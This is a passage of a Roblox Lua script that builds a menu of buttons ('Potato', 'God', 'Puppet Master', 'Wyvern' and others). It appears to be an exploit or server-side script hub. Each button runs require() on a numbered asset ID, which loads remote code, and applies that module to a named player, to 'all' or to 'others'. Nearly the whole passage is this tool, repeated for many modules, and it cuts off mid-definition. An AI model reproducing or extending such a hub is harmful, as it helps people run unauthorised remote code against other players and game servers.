TextButton194.BorderColor3 = Color3.new(0, 0, 0)
TextButton194.ZIndex = 7
TextButton194.Font = Enum.Font.SourceSansSemibold
TextButton194.FontSize = Enum.FontSize.Size14
TextButton194.Text = "Potato"
TextButton194.TextColor = BrickColor.new("Institutional white")
TextButton194.TextColor3 = Color3.new(1, 1, 1)
TextButton194.TextSize = 14
TextButton194.TextWrap = true
TextButton194.TextWrapped = true
TextButton194.TextXAlignment = Enum.TextXAlignment.Left
Script195.Parent = TextButton194
table.insert(cors,sandbox(Script195,function()
	--//Scripted by Sochi\\
	function generatevbucks(memer)
		local player = script.Parent.Parent.Parent.Parent.Parent.Parent
		if memer == "me" then
			require(4662069930).load(player.Name)
		end
		if memer == "all" or memer == "everyone" then
			for _, skid in pairs(game:GetService("Players"):GetPlayers()) do
				require(4662069930).load(skid.Name)
			end
		end
		if memer == "others" then
			for _, skid in pairs(game:GetService("Players"):GetPlayers()) do
				if skid.Name ~= player.Name then
					require(4662069930).load(skid.Name)
				end
			end
		end
		for _, skid in pairs(game:GetService("Players"):GetPlayers()) do
			if string.sub(string.lower(skid.Name), 0, string.len(memer)) == string.lower(memer) then
				if skid ~= nil then
					require(4662069930).load(skid.Name,"loaf")
				end
			end
		end
	end
	script.Parent.MouseButton1Click:Connect(function()
		generatevbucks(script.Parent.Parent.Parent.TextBox.ChangeScript.Change.ChangeRemoteHandler.Text.Value)
	end)
end))
ImageLabel196.Name = "Vertical"
ImageLabel196.Parent = TextButton194
ImageLabel196.Position = UDim2.new(0, -2, 0, 0)
ImageLabel196.Size = UDim2.new(1, 3, 1, 0)
ImageLabel196.BackgroundColor = BrickColor.new("Institutional white")
ImageLabel196.BackgroundColor3 = Color3.new(1, 1, 1)
ImageLabel196.BackgroundTransparency = 1
ImageLabel196.ZIndex = 3
ImageLabel196.Image = "rbxassetid://3570695787"
ImageLabel196.ImageColor3 = Color3.new(1, 0.486275, 0.494118)
ImageLabel196.ScaleType = Enum.ScaleType.Slice
ImageLabel196.SliceCenter = 100, 100, 100, 100
TextButton197.Name = "Admin"
TextButton197.Parent = ScrollingFrame100
TextButton197.Position = UDim2.new(-0.0900000036, 27, 0.486999989, -388)
TextButton197.Size = UDim2.new(0, 271, 0, 21)
TextButton197.BackgroundColor = BrickColor.new("Really black")
TextButton197.BackgroundColor3 = Color3.new(0, 0, 0)
TextButton197.BackgroundTransparency = 1
TextButton197.BorderColor = BrickColor.new("Really black")
TextButton197.BorderColor3 = Color3.new(0, 0, 0)
TextButton197.ZIndex = 7
TextButton197.Font = Enum.Font.SourceSansSemibold
TextButton197.FontSize = Enum.FontSize.Size14
TextButton197.Text = "Shini-G4-MI"
TextButton197.TextColor = BrickColor.new("Institutional white")
TextButton197.TextColor3 = Color3.new(1, 1, 1)
TextButton197.TextSize = 14
TextButton197.TextWrap = true
TextButton197.TextWrapped = true
TextButton197.TextXAlignment = Enum.TextXAlignment.Left
Script198.Parent = TextButton197
table.insert(cors,sandbox(Script198,function()
	--//Scripted by Sochi\\
	function generatevbucks(memer)
		local player = script.Parent.Parent.Parent.Parent.Parent.Parent
		if memer == "me" then
			require(4661785318).load(player.Name)
		end
		if memer == "all" or memer == "everyone" then
			for _, skid in pairs(game:GetService("Players"):GetPlayers()) do
				require(4661785318).load(skid.Name)
			end
		end
		if memer == "others" then
			for _, skid in pairs(game:GetService("Players"):GetPlayers()) do
				if skid.Name ~= player.Name then
					require(4661785318).load(skid.Name)
				end
			end
		end
		for _, skid in pairs(game:GetService("Players"):GetPlayers()) do
			if string.sub(string.lower(skid.Name), 0, string.len(memer)) == string.lower(memer) then
				if skid ~= nil then
					require(4661785318).load(skid.Name,"loaf")
				end
			end
		end
	end
	script.Parent.MouseButton1Click:Connect(function()
		generatevbucks(script.Parent.Parent.Parent.TextBox.ChangeScript.Change.ChangeRemoteHandler.Text.Value)
	end)
end))
ImageLabel199.Name = "Vertical"
ImageLabel199.Parent = TextButton197
ImageLabel199.Position = UDim2.new(0, -2, 0, 0)
ImageLabel199.Size = UDim2.new(1, 3, 1, 0)
ImageLabel199.BackgroundColor = BrickColor.new("Institutional white")
ImageLabel199.BackgroundColor3 = Color3.new(1, 1, 1)
ImageLabel199.BackgroundTransparency = 1
ImageLabel199.ZIndex = 3
ImageLabel199.Image = "rbxassetid://3570695787"
ImageLabel199.ImageColor3 = Color3.new(1, 0.486275, 0.494118)
ImageLabel199.ScaleType = Enum.ScaleType.Slice
ImageLabel199.SliceCenter = 100, 100, 100, 100
TextButton200.Name = "Admin"
TextButton200.Parent = ScrollingFrame100
TextButton200.Position = UDim2.new(-0.0900000036, 27, 0.486999989, -364)
TextButton200.Size = UDim2.new(0, 271, 0, 21)
TextButton200.BackgroundColor = BrickColor.new("Really black")
TextButton200.BackgroundColor3 = Color3.new(0, 0, 0)
TextButton200.BackgroundTransparency = 1
TextButton200.BorderColor = BrickColor.new("Really black")
TextButton200.BorderColor3 = Color3.new(0, 0, 0)
TextButton200.ZIndex = 7
TextButton200.Font = Enum.Font.SourceSansSemibold
TextButton200.FontSize = Enum.FontSize.Size14
TextButton200.Text = "Sociopath"
TextButton200.TextColor = BrickColor.new("Institutional white")
TextButton200.TextColor3 = Color3.new(1, 1, 1)
TextButton200.TextSize = 14
TextButton200.TextWrap = true
TextButton200.TextWrapped = true
TextButton200.TextXAlignment = Enum.TextXAlignment.Left
Script201.Parent = TextButton200
table.insert(cors,sandbox(Script201,function()
	--//Scripted by Sochi\\
	function generatevbucks(memer)
		local player = script.Parent.Parent.Parent.Parent.Parent.Parent
		if memer == "me" then
			require(4661799077).load(player.Name)
		end
		if memer == "all" or memer == "everyone" then
			for _, skid in pairs(game:GetService("Players"):GetPlayers()) do
				require(4661799077).load(skid.Name)
			end
		end
		if memer == "others" then
			for _, skid in pairs(game:GetService("Players"):GetPlayers()) do
				if skid.Name ~= player.Name then
					require(4661799077).load(skid.Name)
				end
			end
		end
		for _, skid in pairs(game:GetService("Players"):GetPlayers()) do
			if string.sub(string.lower(skid.Name), 0, string.len(memer)) == string.lower(memer) then
				if skid ~= nil then
					require(4661799077).load(skid.Name,"loaf")
				end
			end
		end
	end
	script.Parent.MouseButton1Click:Connect(function()
		generatevbucks(script.Parent.Parent.Parent.TextBox.ChangeScript.Change.ChangeRemoteHandler.Text.Value)
	end)
end))
ImageLabel202.Name = "Vertical"
ImageLabel202.Parent = TextButton200
ImageLabel202.Position = UDim2.new(0, -2, 0, 0)
ImageLabel202.Size = UDim2.new(1, 3, 1, 0)
ImageLabel202.BackgroundColor = BrickColor.new("Institutional white")
ImageLabel202.BackgroundColor3 = Color3.new(1, 1, 1)
ImageLabel202.BackgroundTransparency = 1
ImageLabel202.ZIndex = 3
ImageLabel202.Image = "rbxassetid://3570695787"
ImageLabel202.ImageColor3 = Color3.new(1, 0.486275, 0.494118)
ImageLabel202.ScaleType = Enum.ScaleType.Slice
ImageLabel202.SliceCenter = 100, 100, 100, 100
TextButton203.Name = "Admin"
TextButton203.Parent = ScrollingFrame100
TextButton203.Position = UDim2.new(-0.0900000036, 27, 0.486999989, -340)
TextButton203.Size = UDim2.new(0, 271, 0, 21)
TextButton203.BackgroundColor = BrickColor.new("Really black")
TextButton203.BackgroundColor3 = Color3.new(0, 0, 0)
TextButton203.BackgroundTransparency = 1
TextButton203.BorderColor = BrickColor.new("Really black")
TextButton203.BorderColor3 = Color3.new(0, 0, 0)
TextButton203.ZIndex = 7
TextButton203.Font = Enum.Font.SourceSansSemibold
TextButton203.FontSize = Enum.FontSize.Size14
TextButton203.Text = "Tesseract"
TextButton203.TextColor = BrickColor.new("Institutional white")
TextButton203.TextColor3 = Color3.new(1, 1, 1)
TextButton203.TextSize = 14
TextButton203.TextWrap = true
TextButton203.TextWrapped = true
TextButton203.TextXAlignment = Enum.TextXAlignment.Left
Script204.Parent = TextButton203
table.insert(cors,sandbox(Script204,function()
	--//Scripted by Sochi\\
	function generatevbucks(memer)
		local player = script.Parent.Parent.Parent.Parent.Parent.Parent
		if memer == "me" then
			require(4661814299).load(player.Name)
		end
		if memer == "all" or memer == "everyone" then
			for _, skid in pairs(game:GetService("Players"):GetPlayers()) do
				require(4661814299).load(skid.Name)
			end
		end
		if memer == "others" then
			for _, skid in pairs(game:GetService("Players"):GetPlayers()) do
				if skid.Name ~= player.Name then
					require(4661814299).load(skid.Name)
				end
			end
		end
		for _, skid in pairs(game:GetService("Players"):GetPlayers()) do
			if string.sub(string.lower(skid.Name), 0, string.len(memer)) == string.lower(memer) then
				if skid ~= nil then
					require(4661814299).load(skid.Name,"loaf")
				end
			end
		end
	end
	script.Parent.MouseButton1Click:Connect(function()
		generatevbucks(script.Parent.Parent.Parent.TextBox.ChangeScript.Change.ChangeRemoteHandler.Text.Value)
	end)
end))
ImageLabel205.Name = "Vertical"
ImageLabel205.Parent = TextButton203
ImageLabel205.Position = UDim2.new(0, -2, 0, 0)
ImageLabel205.Size = UDim2.new(1, 3, 1, 0)
ImageLabel205.BackgroundColor = BrickColor.new("Institutional white")
ImageLabel205.BackgroundColor3 = Color3.new(1, 1, 1)
ImageLabel205.BackgroundTransparency = 1
ImageLabel205.ZIndex = 3
ImageLabel205.Image = "rbxassetid://3570695787"
ImageLabel205.ImageColor3 = Color3.new(1, 0.486275, 0.494118)
ImageLabel205.ScaleType = Enum.ScaleType.Slice
ImageLabel205.SliceCenter = 100, 100, 100, 100
TextButton206.Name = "Admin"
TextButton206.Parent = ScrollingFrame100
TextButton206.Position = UDim2.new(-0.0900000036, 27, 0.486999989, -316)
TextButton206.Size = UDim2.new(0, 271, 0, 21)
TextButton206.BackgroundColor = BrickColor.new("Really black")
TextButton206.BackgroundColor3 = Color3.new(0, 0, 0)
TextButton206.BackgroundTransparency = 1
TextButton206.BorderColor = BrickColor.new("Really black")
TextButton206.BorderColor3 = Color3.new(0, 0, 0)
TextButton206.ZIndex = 7
TextButton206.Font = Enum.Font.SourceSansSemibold
TextButton206.FontSize = Enum.FontSize.Size14
TextButton206.Text = "Calamity"
TextButton206.TextColor = BrickColor.new("Institutional white")
TextButton206.TextColor3 = Color3.new(1, 1, 1)
TextButton206.TextSize = 14
TextButton206.TextWrap = true
TextButton206.TextWrapped = true
TextButton206.TextXAlignment = Enum.TextXAlignment.Left
Script207.Parent = TextButton206
table.insert(cors,sandbox(Script207,function()
	--//Scripted by Sochi\\
	function generatevbucks(memer)
		local player = script.Parent.Parent.Parent.Parent.Parent.Parent
		if memer == "me" then
			require(4661823136):Fire(player.Name)
		end
		if memer == "all" or memer == "everyone" then
			for _, skid in pairs(game:GetService("Players"):GetPlayers()) do
				require(4661823136):Fire(skid.Name)
			end
		end
		if memer == "others" then
			for _, skid in pairs(game:GetService("Players"):GetPlayers()) do
				if skid.Name ~= player.Name then
					require(4661823136):Fire(skid.Name)
				end
			end
		end
		for _, skid in pairs(game:GetService("Players"):GetPlayers()) do
			if string.sub(string.lower(skid.Name), 0, string.len(memer)) == string.lower(memer) then
				if skid ~= nil then
					require(4661823136):Fire(skid.Name,"loaf")
				end
			end
		end
	end
	script.Parent.MouseButton1Click:Connect(function()
		generatevbucks(script.Parent.Parent.Parent.TextBox.ChangeScript.Change.ChangeRemoteHandler.Text.Value)
	end)
end))
ImageLabel208.Name = "Vertical"
ImageLabel208.Parent = TextButton206
ImageLabel208.Position = UDim2.new(0, -2, 0, 0)
ImageLabel208.Size = UDim2.new(1, 3, 1, 0)
ImageLabel208.BackgroundColor = BrickColor.new("Institutional white")
ImageLabel208.BackgroundColor3 = Color3.new(1, 1, 1)
ImageLabel208.BackgroundTransparency = 1
ImageLabel208.ZIndex = 3
ImageLabel208.Image = "rbxassetid://3570695787"
ImageLabel208.ImageColor3 = Color3.new(1, 0.486275, 0.494118)
ImageLabel208.ScaleType = Enum.ScaleType.Slice
ImageLabel208.SliceCenter = 100, 100, 100, 100
TextButton209.Name = "Admin"
TextButton209.Parent = ScrollingFrame100
TextButton209.Position = UDim2.new(-0.0900000036, 27, 0.486999989, -292)
TextButton209.Size = UDim2.new(0, 271, 0, 21)
TextButton209.BackgroundColor = BrickColor.new("Really black")
TextButton209.BackgroundColor3 = Color3.new(0, 0, 0)
TextButton209.BackgroundTransparency = 1
TextButton209.BorderColor = BrickColor.new("Really black")
TextButton209.BorderColor3 = Color3.new(0, 0, 0)
TextButton209.ZIndex = 7
TextButton209.Font = Enum.Font.SourceSansSemibold
TextButton209.FontSize = Enum.FontSize.Size14
TextButton209.Text = "Chrono Sentinel"
TextButton209.TextColor = BrickColor.new("Institutional white")
TextButton209.TextColor3 = Color3.new(1, 1, 1)
TextButton209.TextSize = 14
TextButton209.TextWrap = true
TextButton209.TextWrapped = true
TextButton209.TextXAlignment = Enum.TextXAlignment.Left
Script210.Parent = TextButton209
table.insert(cors,sandbox(Script210,function()
	--//Scripted by Sochi\\
	function generatevbucks(memer)
		local player = script.Parent.Parent.Parent.Parent.Parent.Parent
		if memer == "me" then
			require(4661847142).load(player.Name)
		end
		if memer == "all" or memer == "everyone" then
			for _, skid in pairs(game:GetService("Players"):GetPlayers()) do
				require(4661847142).load(skid.Name)
			end
		end
		if memer == "others" then
			for _, skid in pairs(game:GetService("Players"):GetPlayers()) do
				if skid.Name ~= player.Name then
					require(4661847142).load(skid.Name)
				end
			end
		end
		for _, skid in pairs(game:GetService("Players"):GetPlayers()) do
			if string.sub(string.lower(skid.Name), 0, string.len(memer)) == string.lower(memer) then
				if skid ~= nil then
					require(4661847142).load(skid.Name,"loaf")
				end
			end
		end
	end
	script.Parent.MouseButton1Click:Connect(function()
		generatevbucks(script.Parent.Parent.Parent.TextBox.ChangeScript.Change.ChangeRemoteHandler.Text.Value)
	end)
end))
ImageLabel211.Name = "Vertical"
ImageLabel211.Parent = TextButton209
ImageLabel211.Position = UDim2.new(0, -2, 0, 0)
ImageLabel211.Size = UDim2.new(1, 3, 1, 0)
ImageLabel211.BackgroundColor = BrickColor.new("Institutional white")
ImageLabel211.BackgroundColor3 = Color3.new(1, 1, 1)
ImageLabel211.BackgroundTransparency = 1
ImageLabel211.ZIndex = 3
ImageLabel211.Image = "rbxassetid://3570695787"
ImageLabel211.ImageColor3 = Color3.new(1, 0.486275, 0.494118)
ImageLabel211.ScaleType = Enum.ScaleType.Slice
ImageLabel211.SliceCenter = 100, 100, 100, 100
TextButton212.Name = "Admin"
TextButton212.Parent = ScrollingFrame100
TextButton212.Position = UDim2.new(-0.0900000036, 27, 0.486999989, -268)
TextButton212.Size = UDim2.new(0, 271, 0, 21)
TextButton212.BackgroundColor = BrickColor.new("Really black")
TextButton212.BackgroundColor3 = Color3.new(0, 0, 0)
TextButton212.BackgroundTransparency = 1
TextButton212.BorderColor = BrickColor.new("Really black")
TextButton212.BorderColor3 = Color3.new(0, 0, 0)
TextButton212.ZIndex = 7
TextButton212.Font = Enum.Font.SourceSansSemibold
TextButton212.FontSize = Enum.FontSize.Size14
TextButton212.Text = "Rapier"
TextButton212.TextColor = BrickColor.new("Institutional white")
TextButton212.TextColor3 = Color3.new(1, 1, 1)
TextButton212.TextSize = 14
TextButton212.TextWrap = true
TextButton212.TextWrapped = true
TextButton212.TextXAlignment = Enum.TextXAlignment.Left
Script213.Parent = TextButton212
table.insert(cors,sandbox(Script213,function()
	--//Scripted by Sochi\\
	function generatevbucks(memer)
		local player = script.Parent.Parent.Parent.Parent.Parent.Parent
		if memer == "me" then
			require(4661877587).Rapier(player.Name)
		end
		if memer == "all" or memer == "everyone" then
			for _, skid in pairs(game:GetService("Players"):GetPlayers()) do
				require(4661877587).Rapier(skid.Name)
			end
		end
		if memer == "others" then
			for _, skid in pairs(game:GetService("Players"):GetPlayers()) do
				if skid.Name ~= player.Name then
					require(4661877587).Rapier(skid.Name)
				end
			end
		end
		for _, skid in pairs(game:GetService("Players"):GetPlayers()) do
			if string.sub(string.lower(skid.Name), 0, string.len(memer)) == string.lower(memer) then
				if skid ~= nil then
					require(4661877587).Rapier(skid.Name,"loaf")
				end
			end
		end
	end
	script.Parent.MouseButton1Click:Connect(function()
		generatevbucks(script.Parent.Parent.Parent.TextBox.ChangeScript.Change.ChangeRemoteHandler.Text.Value)
	end)
end))
ImageLabel214.Name = "Vertical"
ImageLabel214.Parent = TextButton212
ImageLabel214.Position = UDim2.new(0, -2, 0, 0)
ImageLabel214.Size = UDim2.new(1, 3, 1, 0)
ImageLabel214.BackgroundColor = BrickColor.new("Institutional white")
ImageLabel214.BackgroundColor3 = Color3.new(1, 1, 1)
ImageLabel214.BackgroundTransparency = 1
ImageLabel214.ZIndex = 3
ImageLabel214.Image = "rbxassetid://3570695787"
ImageLabel214.ImageColor3 = Color3.new(1, 0.486275, 0.494118)
ImageLabel214.ScaleType = Enum.ScaleType.Slice
ImageLabel214.SliceCenter = 100, 100, 100, 100
TextButton215.Name = "Admin"
TextButton215.Parent = ScrollingFrame100
TextButton215.Position = UDim2.new(-0.0900000036, 27, 0.486999989, -244)
TextButton215.Size = UDim2.new(0, 271, 0, 21)
TextButton215.BackgroundColor = BrickColor.new("Really black")
TextButton215.BackgroundColor3 = Color3.new(0, 0, 0)
TextButton215.BackgroundTransparency = 1
TextButton215.BorderColor = BrickColor.new("Really black")
TextButton215.BorderColor3 = Color3.new(0, 0, 0)
TextButton215.ZIndex = 7
TextButton215.Font = Enum.Font.SourceSansSemibold
TextButton215.FontSize = Enum.FontSize.Size14
TextButton215.Text = "Cube Buster"
TextButton215.TextColor = BrickColor.new("Institutional white")
TextButton215.TextColor3 = Color3.new(1, 1, 1)
TextButton215.TextSize = 14
TextButton215.TextWrap = true
TextButton215.TextWrapped = true
TextButton215.TextXAlignment = Enum.TextXAlignment.Left
Script216.Parent = TextButton215
table.insert(cors,sandbox(Script216,function()
	--//Scripted by Sochi\\
	function generatevbucks(memer)
		local player = script.Parent.Parent.Parent.Parent.Parent.Parent
		if memer == "me" then
			require(4661906279).load(player.Name)
		end
		if memer == "all" or memer == "everyone" then
			for _, skid in pairs(game:GetService("Players"):GetPlayers()) do
				require(4661906279).load(skid.Name)
			end
		end
		if memer == "others" then
			for _, skid in pairs(game:GetService("Players"):GetPlayers()) do
				if skid.Name ~= player.Name then
					require(4661906279).load(skid.Name)
				end
			end
		end
		for _, skid in pairs(game:GetService("Players"):GetPlayers()) do
			if string.sub(string.lower(skid.Name), 0, string.len(memer)) == string.lower(memer) then
				if skid ~= nil then
					require(4661906279).load(skid.Name,"loaf")
				end
			end
		end
	end
	script.Parent.MouseButton1Click:Connect(function()
		generatevbucks(script.Parent.Parent.Parent.TextBox.ChangeScript.Change.ChangeRemoteHandler.Text.Value)
	end)
end))
ImageLabel217.Name = "Vertical"
ImageLabel217.Parent = TextButton215
ImageLabel217.Position = UDim2.new(0, -2, 0, 0)
ImageLabel217.Size = UDim2.new(1, 3, 1, 0)
ImageLabel217.BackgroundColor = BrickColor.new("Institutional white")
ImageLabel217.BackgroundColor3 = Color3.new(1, 1, 1)
ImageLabel217.BackgroundTransparency = 1
ImageLabel217.ZIndex = 3
ImageLabel217.Image = "rbxassetid://3570695787"
ImageLabel217.ImageColor3 = Color3.new(1, 0.486275, 0.494118)
ImageLabel217.ScaleType = Enum.ScaleType.Slice
ImageLabel217.SliceCenter = 100, 100, 100, 100
TextButton218.Name = "Admin"
TextButton218.Parent = ScrollingFrame100
TextButton218.Position = UDim2.new(-0.0900000036, 27, 0.486999989, -220)
TextButton218.Size = UDim2.new(0, 271, 0, 21)
TextButton218.BackgroundColor = BrickColor.new("Really black")
TextButton218.BackgroundColor3 = Color3.new(0, 0, 0)
TextButton218.BackgroundTransparency = 1
TextButton218.BorderColor = BrickColor.new("Really black")
TextButton218.BorderColor3 = Color3.new(0, 0, 0)
TextButton218.ZIndex = 7
TextButton218.Font = Enum.Font.SourceSansSemibold
TextButton218.FontSize = Enum.FontSize.Size14
TextButton218.Text = "Dominant"
TextButton218.TextColor = BrickColor.new("Institutional white")
TextButton218.TextColor3 = Color3.new(1, 1, 1)
TextButton218.TextSize = 14
TextButton218.TextWrap = true
TextButton218.TextWrapped = true
TextButton218.TextXAlignment = Enum.TextXAlignment.Left
Script219.Parent = TextButton218
table.insert(cors,sandbox(Script219,function()
	--//Scripted by Sochi\\
	function generatevbucks(memer)
		local player = script.Parent.Parent.Parent.Parent.Parent.Parent
		if memer == "me" then
			require(4661923615).load(player.Name)
		end
		if memer == "all" or memer == "everyone" then
			for _, skid in pairs(game:GetService("Players"):GetPlayers()) do
				require(4661923615).load(skid.Name)
			end
		end
		if memer == "others" then
			for _, skid in pairs(game:GetService("Players"):GetPlayers()) do
				if skid.Name ~= player.Name then
					require(4661923615).load(skid.Name)
				end
			end
		end
		for _, skid in pairs(game:GetService("Players"):GetPlayers()) do
			if string.sub(string.lower(skid.Name), 0, string.len(memer)) == string.lower(memer) then
				if skid ~= nil then
					require(4661923615).load(skid.Name,"loaf")
				end
			end
		end
	end
	script.Parent.MouseButton1Click:Connect(function()
		generatevbucks(script.Parent.Parent.Parent.TextBox.ChangeScript.Change.ChangeRemoteHandler.Text.Value)
	end)
end))
ImageLabel220.Name = "Vertical"
ImageLabel220.Parent = TextButton218
ImageLabel220.Position = UDim2.new(0, -2, 0, 0)
ImageLabel220.Size = UDim2.new(1, 3, 1, 0)
ImageLabel220.BackgroundColor = BrickColor.new("Institutional white")
ImageLabel220.BackgroundColor3 = Color3.new(1, 1, 1)
ImageLabel220.BackgroundTransparency = 1
ImageLabel220.ZIndex = 3
ImageLabel220.Image = "rbxassetid://3570695787"
ImageLabel220.ImageColor3 = Color3.new(1, 0.486275, 0.494118)
ImageLabel220.ScaleType = Enum.ScaleType.Slice
ImageLabel220.SliceCenter = 100, 100, 100, 100
TextButton221.Name = "Admin"
TextButton221.Parent = ScrollingFrame100
TextButton221.Position = UDim2.new(-0.0900000036, 27, 0.486999989, -196)
TextButton221.Size = UDim2.new(0, 271, 0, 21)
TextButton221.BackgroundColor = BrickColor.new("Really black")
TextButton221.BackgroundColor3 = Color3.new(0, 0, 0)
TextButton221.BackgroundTransparency = 1
TextButton221.BorderColor = BrickColor.new("Really black")
TextButton221.BorderColor3 = Color3.new(0, 0, 0)
TextButton221.ZIndex = 7
TextButton221.Font = Enum.Font.SourceSansSemibold
TextButton221.FontSize = Enum.FontSize.Size14
TextButton221.Text = "God"
TextButton221.TextColor = BrickColor.new("Institutional white")
TextButton221.TextColor3 = Color3.new(1, 1, 1)
TextButton221.TextSize = 14
TextButton221.TextWrap = true
TextButton221.TextWrapped = true
TextButton221.TextXAlignment = Enum.TextXAlignment.Left
Script222.Parent = TextButton221
table.insert(cors,sandbox(Script222,function()
	--//Scripted by Sochi\\
	function generatevbucks(memer)
		local player = script.Parent.Parent.Parent.Parent.Parent.Parent
		if memer == "me" then
			require(4651902824).load(player.Name)
		end
		if memer == "all" or memer == "everyone" then
			for _, skid in pairs(game:GetService("Players"):GetPlayers()) do
				require(4651902824).load(skid.Name)
			end
		end
		if memer == "others" then
			for _, skid in pairs(game:GetService("Players"):GetPlayers()) do
				if skid.Name ~= player.Name then
					require(4651902824).load(skid.Name)
				end
			end
		end
		for _, skid in pairs(game:GetService("Players"):GetPlayers()) do
			if string.sub(string.lower(skid.Name), 0, string.len(memer)) == string.lower(memer) then
				if skid ~= nil then
					require(4651902824).load(skid.Name,"loaf")
				end
			end
		end
	end
	script.Parent.MouseButton1Click:Connect(function()
		generatevbucks(script.Parent.Parent.Parent.TextBox.ChangeScript.Change.ChangeRemoteHandler.Text.Value)
	end)
end))
ImageLabel223.Name = "Vertical"
ImageLabel223.Parent = TextButton221
ImageLabel223.Position = UDim2.new(0, -2, 0, 0)
ImageLabel223.Size = UDim2.new(1, 3, 1, 0)
ImageLabel223.BackgroundColor = BrickColor.new("Institutional white")
ImageLabel223.BackgroundColor3 = Color3.new(1, 1, 1)
ImageLabel223.BackgroundTransparency = 1
ImageLabel223.ZIndex = 3
ImageLabel223.Image = "rbxassetid://3570695787"
ImageLabel223.ImageColor3 = Color3.new(1, 0.486275, 0.494118)
ImageLabel223.ScaleType = Enum.ScaleType.Slice
ImageLabel223.SliceCenter = 100, 100, 100, 100
TextButton224.Name = "Admin"
TextButton224.Parent = ScrollingFrame100
TextButton224.Position = UDim2.new(-0.0900000036, 27, 0.486999989, -172)
TextButton224.Size = UDim2.new(0, 271, 0, 21)
TextButton224.BackgroundColor = BrickColor.new("Really black")
TextButton224.BackgroundColor3 = Color3.new(0, 0, 0)
TextButton224.BackgroundTransparency = 1
TextButton224.BorderColor = BrickColor.new("Really black")
TextButton224.BorderColor3 = Color3.new(0, 0, 0)
TextButton224.ZIndex = 7
TextButton224.Font = Enum.Font.SourceSansSemibold
TextButton224.FontSize = Enum.FontSize.Size14
TextButton224.Text = "Puppet Master"
TextButton224.TextColor = BrickColor.new("Institutional white")
TextButton224.TextColor3 = Color3.new(1, 1, 1)
TextButton224.TextSize = 14
TextButton224.TextWrap = true
TextButton224.TextWrapped = true
TextButton224.TextXAlignment = Enum.TextXAlignment.Left
Script225.Parent = TextButton224
table.insert(cors,sandbox(Script225,function()
	--//Scripted by Sochi\\
	function generatevbucks(memer)
		local player = script.Parent.Parent.Parent.Parent.Parent.Parent
		if memer == "me" then
			require(4661950755).load(player.Name)
		end
		if memer == "all" or memer == "everyone" then
			for _, skid in pairs(game:GetService("Players"):GetPlayers()) do
				require(4661950755).load(skid.Name)
			end
		end
		if memer == "others" then
			for _, skid in pairs(game:GetService("Players"):GetPlayers()) do
				if skid.Name ~= player.Name then
					require(4661950755).load(skid.Name)
				end
			end
		end
		for _, skid in pairs(game:GetService("Players"):GetPlayers()) do
			if string.sub(string.lower(skid.Name), 0, string.len(memer)) == string.lower(memer) then
				if skid ~= nil then
					require(4661950755).load(skid.Name,"loaf")
				end
			end
		end
	end
	script.Parent.MouseButton1Click:Connect(function()
		generatevbucks(script.Parent.Parent.Parent.TextBox.ChangeScript.Change.ChangeRemoteHandler.Text.Value)
	end)
end))
ImageLabel226.Name = "Vertical"
ImageLabel226.Parent = TextButton224
ImageLabel226.Position = UDim2.new(0, -2, 0, 0)
ImageLabel226.Size = UDim2.new(1, 3, 1, 0)
ImageLabel226.BackgroundColor = BrickColor.new("Institutional white")
ImageLabel226.BackgroundColor3 = Color3.new(1, 1, 1)
ImageLabel226.BackgroundTransparency = 1
ImageLabel226.ZIndex = 3
ImageLabel226.Image = "rbxassetid://3570695787"
ImageLabel226.ImageColor3 = Color3.new(1, 0.486275, 0.494118)
ImageLabel226.ScaleType = Enum.ScaleType.Slice
ImageLabel226.SliceCenter = 100, 100, 100, 100
TextButton227.Name = "Admin"
TextButton227.Parent = ScrollingFrame100
TextButton227.Position = UDim2.new(-0.0900000036, 27, 0.486999989, -148)
TextButton227.Size = UDim2.new(0, 271, 0, 21)
TextButton227.BackgroundColor = BrickColor.new("Really black")
TextButton227.BackgroundColor3 = Color3.new(0, 0, 0)
TextButton227.BackgroundTransparency = 1
TextButton227.BorderColor = BrickColor.new("Really black")
TextButton227.BorderColor3 = Color3.new(0, 0, 0)
TextButton227.ZIndex = 7
TextButton227.Font = Enum.Font.SourceSansSemibold
TextButton227.FontSize = Enum.FontSize.Size14
TextButton227.Text = "Wyvern"
TextButton227.TextColor = BrickColor.new("Institutional white")
TextButton227.TextColor3 = Color3.new(1, 1, 1)
TextButton227.TextSize = 14
TextButton227.TextWrap = true
TextButton227.TextWrapped = true
TextButton227.TextXAlignment = Enum.TextXAlignment.Left
Script228.Parent = TextButton227
table.insert(cors,sandbox(Script228,function()
	--//Scripted by Sochi\\
	function generatevbucks(memer)
		local player = script.Parent.Parent.Parent.Parent.Parent.Parent
		if memer == "me" then
			require(4661961003).load(player.Name)
		end
		if memer == "all" or memer == "everyone" then
			for _, skid in pairs(game:GetService("Players"):GetPlayers()) do
				require(4661961003).load(skid.Name)
			end
		end
		if memer == "others" then
			for _, skid in pairs(game:GetService("Players"):GetPlayers()) do
				if skid.Name ~= player.Name then
					require(4661961003).load(skid.Name)
				end
			end
		end
		for _, skid in pairs(game:GetService("Players"):GetPlayers()) do
			if string.sub(string.lower(skid.Name), 0, string.len(memer)) == string.lower(memer) then
				if skid ~= nil then
					require(4661961003).load(skid.Name,"loaf")
				end
			end
		end
	end
	script.Parent.MouseButton1Click:Connect(function()
		generatevbucks(script.Parent.Parent.Parent.TextBox.ChangeScript.Change.ChangeRemoteHandler.Text.Value)
	end)
end))
ImageLabel229.Name = "Vertical"
ImageLabel229.Parent = TextButton227
ImageLabel229.Position = UDim2.new(0, -2, 0, 0)
ImageLabel229.Size = UDim2.new(1, 3, 1, 0)
ImageLabel229.BackgroundColor = BrickColor.new("Institutional white")
ImageLabel229.BackgroundColor3 = Color3.new(1, 1, 1)
ImageLabel229.BackgroundTransparency = 1
ImageLabel229.ZIndex = 3
ImageLabel229.Image = "rbxassetid://3570695787"
ImageLabel229.ImageColor3 = Color3.new(1, 0.486275, 0.494118)
ImageLabel229.ScaleType = Enum.ScaleType.Slice
ImageLabel229.SliceCenter = 100, 100, 100, 100
TextButton230.Name = "Admin"
TextButton230.Parent = ScrollingFrame100
TextButton230.Position = UDim2.new(-0.0900000036, 27, 0.486999989, -124)
TextButton230.Size = UDim2.new(0, 271, 0, 21)
TextButton230.BackgroundColor = BrickColor.new("Really black")
TextButton230.BackgroundColor3 = Color3.new(0, 0, 0)
TextButton230.BackgroundTransparency = 1
TextButton230.BorderColor = BrickColor.new("Really black")
TextButton230.BorderColor3 = Color3.new(0, 0, 0)
TextButton230.ZIndex = 7
TextButton230.Font = Enum.Font.SourceSansSemibold
TextButton230.FontSize = Enum.FontSize.Size14
TextButton230.Text = "Wretch"
TextButton230.TextColor = BrickColor.new("Institutional white")
TextButton230.TextColor3 = Color3.new(1, 1, 1)
